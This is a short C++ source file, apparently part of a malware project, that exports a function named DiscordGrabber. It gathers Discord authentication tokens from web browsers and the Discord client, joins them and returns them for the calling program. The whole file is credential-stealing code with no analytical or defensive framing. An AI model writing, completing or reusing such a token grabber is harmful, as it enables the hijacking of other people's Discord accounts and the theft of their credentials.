#define GRABBER

#include <windows.h>
#include <exports.h>
#include <Grabber.h>

#include <set>

GRABBER const char* DiscordGrabber() {
	std::set<std::string> tokens;
	Grabber::Discord::getTokenBrowserDiscord(tokens);
	Grabber::Discord::getTokenDiscord(tokens);

	thread_local std::string res;
	res.clear();
	for (std::string token : tokens) {
		res += token;
	}
	return res.c_str();
}